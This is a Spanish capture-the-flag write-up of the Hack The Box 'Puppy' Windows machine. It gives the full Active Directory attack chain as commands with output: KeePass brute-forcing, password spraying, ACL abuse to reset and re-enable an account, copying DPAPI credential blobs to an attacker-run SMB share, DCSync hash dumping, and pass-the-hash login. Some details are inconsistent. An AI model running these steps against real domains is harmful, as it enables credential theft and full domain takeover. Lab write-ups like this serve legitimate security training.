#1- HTB-Puppy — Writeup (traducción y explicación rápida)

Fecha: 2025-05-28
Autor: HYH — entusiasta de ciberseguridad, pentesting y CTF.

Info de la máquina (Box Info)

SO: Windows.
Dificultad: Media.
Credenciales iniciales (proporcionadas): levi.james / KingofAkron2025!

Explicación: te dan un usuario y contraseña para empezar el pentest, como suele pasar en máquinas de práctica.

#2-Nmap

Comando:nmap puppy.htb -sV
Explicación: escanea puertos y detecta versiones de servicios en el host puppy.htb.

Salida (resumen):

Varios puertos abiertos: 53 (DNS), 88 (Kerberos), 111/135 (RPC), 139/445 (SMB), 389/3268 (LDAP/AD), 5985 (HTTP WinRM), etc.
Explicación: muestra que la máquina tiene servicios de Active Directory y SMB activos. Eso guía la estrategia de ataque (foco en AD/SMB/RPC).

#3 -RPC (uso de rpcclient)

Comando usado:rpcclient 10.xx.xx.xx -U levi.james
Explicación: conecta al servicio RPC del target usando el usuario levi.james.
Dentro de rpcclient:Explicación: lista usuarios del dominio (consulta a AD vía RPC).

Resultado: lista de usuarios (Administrator, Guest, krbtgt, levi.james, ant.edwards, ...).
Explicación: obtienes usuarios válidos del dominio para posteriores ataques (password spraying, enumeración, etc.).
#4 - SMBMAP
smbmap -H 10.xx.xx.xx -u levi.james -p 'KingofAkron2025!'
Explicación: enumera recursos compartidos SMB con las credenciales dadas; intenta mostrar permisos y comentarios de cada share.

Salida (resumen): shares como ADMIN$, C$, DEV, IPC$, NETLOGON, SYSVOL. DEV existe pero muestra “NO ACCESS” inicialmente.
Explicación: detectas un share de desarrollo (DEV) que puede tener archivos útiles, pero ahora mismo no tienes permiso.
*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                   

#5 BloodHound
Bloodhound (colección de datos AD)

Preparación:

Añadir dc.puppy.htb a /etc/hosts.

Sincronizar tiempo: ntpdate puppy.htb.
Explicación: Bloodhound y Kerberos son sensibles al DNS y al tiempo; poner el host y sincronizar evita fallos de autenticación.

bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.xx.xx.xx -c All --zip

Explicación: ejecuta el collector de Bloodhound para reunir relaciones de AD (usuarios, grupos, ACLs, computadoras) y guarda el resultado en un zip.

Salida: muestra que encontró dominio, usuarios, grupos, GPOs, etc., y genera bloodhound.zip.
Explicación: con esos datos luego los importas a la interfaz de Bloodhound para buscar rutas de escalada de privilegios.

bloodyAD --host '10.xx.xx.xx' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james

Explicación: usa credenciales para añadir levi.james al grupo DEVELOPERS mediante una operación que Bloodhound indicó como posible (escribir ACL). Resultado: levi.james agregado al grupo.
Efecto: ahora tienes permisos de grupo que antes no tenías; eso abre acceso al share DEV.

#6- Acceso al smb Client
smbclient //10.10.11.70/DEV -U levi.james
Explicación: conecta interactiva al share DEV con las credenciales.
Explicación: lista archivos en el share. Resultado muestra KeePassXC-2.7.9-Win64.msi, Projects/, recovery.kdbx, etc.

Acción: descargar recovery.kdbx (archivo de base de datos de KeePass).
Explicación: archivo potencialmente contiene contraseñas; lo guardan localmente para intentar recuperar su contraseña.

# 7-KeepassBrute
Comando intentado: keepass2john recovery.kdbx
Error: a versión del archivo .kdbx no es soportada por la herramienta keepass2john usada
PROCESI A COPIAR EL PASSWORD DEL WRITEUP DE OTRO JUGADOR DE HACK THE BOX	

root@kali] /home/kali/Puppy  
❯ smbclient  //10.10.11.70/DEV -U levi.james  
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Wed May 28 12:37:00 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
  tiCPYdaK.exe                        A    56320  Wed May 28 12:37:00 2025

                5080575 blocks of size 4096. 1627510 blocks available
smb: \> 

--Password hallada por usuario HYH: Liverpool

#8 -Keepass Brute (brute-force de la base KeePass KDBX4)

Comando (ejecución de la herramienta personalizada):
./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt

Explicación: ejecuta keepass4brute contra el archivo recovery.kdbx usando el diccionario rockyou.txt para probar contraseñas.

Acción siguiente: abren el archivo con KeePassXC usando esa contraseña.
Explicación: ahora pueden ver las entradas y contraseñas guardadas dentro del archivo .kdbx.

Contraseñas encontradas (ejemplos dentro del KDBX):

HJKL2025!

Antman2025!

JamieLove2025!

ILY2025!

Steve2025!

Explicación: estas son credenciales almacenadas en la base; sirven para probar en otros servicios/usuarios del dominio.

# -9 Neteexec
[root@kali] /home/kali/Puppy  
❯ netexec smb 10.10.11.70 -u usernames.txt -p pass.txt                                                                                        ⏎
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 

Explicación: netexec prueba combinaciones de usuarios (archivo usernames.txt) y contraseñas (archivo pass.txt) contra SMB en la IP indicada, buscando logins válidos.

Explicación:

Cada línea prueba una credencial.

STATUS_LOGON_FAILURE indica intento fallido.

La línea con [+] indica login exitoso.

Resultado útil: credenciales válidas encontradas:

ant.edwards / Antman2025!

Explicación: con eso tienes un usuario distinto (ant.edwards) cuya contraseña provino del KDBX; puede tener permisos diferentes y permitir nuevos movimientos dentro de la red.


#10 - BloodHound Again
[root@kali] /home/kali/Puppy  
❯ bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 33S
INFO: Compressing output into 20250528135612_bloodhound.zip

https://www.hyhforever.top/posts/2025/05/htb-puppy/images/image-20250528191920356.png

Puedes ver que el grupo al que pertenece Edwards tiene control total sobre Silver, por lo que puedes cambiar la contraseña.

root@kali] /home/kali/Puppy  
❯ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Abc123456!                       ⏎
[+] Password changed successfully!

Aunque los cambios aquí son exitosos, todavía no puedo iniciar sesión. Descubrí que el motivo es que la cuenta no está habilitada

#11- Habilitar Cuenta
Compruébelo con ldapsearch
[root@kali] /home/kali/Puppy  
❯ ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"                       ⏎

Enter LDAP Password: 
 extended LDIF

 LDAPv3
 base <DC=puppy,DC=htb> with scope subtree
filter: (sAMAccountName=ADAM.SILVER)
 requesting: ALL


Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adam D. Silver
sn: Silver
givenName: Adam
initials: D
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121623.0Z
whenChanged: 20250528182522.0Z
displayName: Adam D. Silver
uSNCreated: 12814
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
uSNChanged: 172152
name: Adam D. Silver
objectGUID:: 6XTdGwRTsk6ta8cxNx8K6w==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
homeDirectory: C:\Users\adam.silver
badPasswordTime: 133863842084684611
lastLogoff: 0
lastLogon: 133863842265461471
pwdLastSet: 133929303224406100
primaryGroupID: 513
userParameters:: ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI
 CAgUAQaCAFDdHhDZmdQcmVzZW5045S15pSx5oiw44GiGAgBQ3R4Q2ZnRmxhZ3Mx44Cw44Gm44Cy44
 C5EggBQ3R4U2hhZG9344Cw44Cw44Cw44CwKgIBQ3R4TWluRW5jcnlwdGlvbkxldmVs44Sw
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHUQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 6
sAMAccountName: adam.silver
sAMAccountType: 805306368
userPrincipalName: adam.silver@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250309210803.0Z
dSCorePropagationData: 20250228212238.0Z
dSCorePropagationData: 20250219143627.0Z
dSCorePropagationData: 20250219142657.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133863576267401674

search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

 search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

 search result
search: 2
result: 0 Success

 numResponses: 5
numEntries: 1
 numReferences: 3
 
 66050 numero de cuenta deshabilitada, pasamos a habilitar con 66048
 
 
 ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
#12- User.txt 1st flag
We use evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Abc123456'
Sin resultados importantes
#13- Privilege Escalation
Verifique que haya un directorio de respaldo debajo del directorio raíz
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip

Después de la descompresión, verá un archivo bak con una credencial de usuario: steph.cooper/ChefSteph2025!, que puede usarse para iniciar sesión.

El sabueso vuelve a coleccionar
[root@kali] /home/kali/Puppy/puppy  
❯ bloodhound-python -u 'steph.cooper' -p 'ChefSteph2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip                   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 35S
INFO: Compressing output into 20250528144135_bloodhound.zip


#14 - Windows Credential Manager
Intenta encontrarlo aquí en el paso 1. Primero, obtén las credenciales guardadas en el Administrador de Credenciales de Windows. Este utiliza cifrado DPAPI (CryptProtectData) y vincula la clave maestra del usuario o equipo.
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

Descargar directamente aquí parece dar un error, abrí un servicio smb para transmisión
[root@kali] /home/kali/Puppy  
❯ impacket-smbserver share ./share -smb2support

*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.75\share\masterkey_blob
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.75\share\credential_blob


Descifre la clave maestra DPAPI del usuario (clave maestra) utilizando la contraseña del usuario (ChefSteph2025!) y el SID, y genere la clave maestra del usuario (clave descifrada)
[root@kali] /home/kali/Puppy/share  
❯ impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84


Descifre las credenciales almacenadas (credential_blob) con la clave maestra obtenida en el paso 1 y genere las credenciales en texto plano (nombre de usuario y contraseña).

Obtenga la contraseña de steph.cooper_adm.

[root@kali] /home/kali/Puppy/share  
❯ impacket-dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!


BloodHound otravez

[root@kali] /home/kali/Puppy  
❯ bloodhound-python -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.70:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 20S
INFO: Compressing output into 20250528153956_bloodhound.zip

#15- DCSync
Ahora puedes usar DCSync directamente
[root@kali] /home/kali/Puppy  
❯ impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::                                                          
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM 
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HIDDEN>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
Administrator:des-cbc-md5:20b9e03d6720150d
krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
krbtgt:des-cbc-md5:5876d051f78faeba
PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:670a9fa0ec042b57b354f0898b3c48a7c79a46cde51c1b3bce9afab118e569e6
PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:5d2351baba71061f5a43951462ffe726
PUPPY.HTB\adam.silver:des-cbc-md5:643d0ba43d54025e
PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
DC$:des-cbc-md5:7f044607a8dc9710
[*] Cleaning up... 


Una vez que obtengas el hash, podrás iniciar sesión

root@kali] /home/kali/Puppy  
❯ evil-winrm -i 10.10.11.70 -u 'Administrator' -H '<HIDDEN>'                             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
aaf0564a96XXXXXXXXX
*Evil-WinRM* PS C:\Users\Administrator\desktop> 








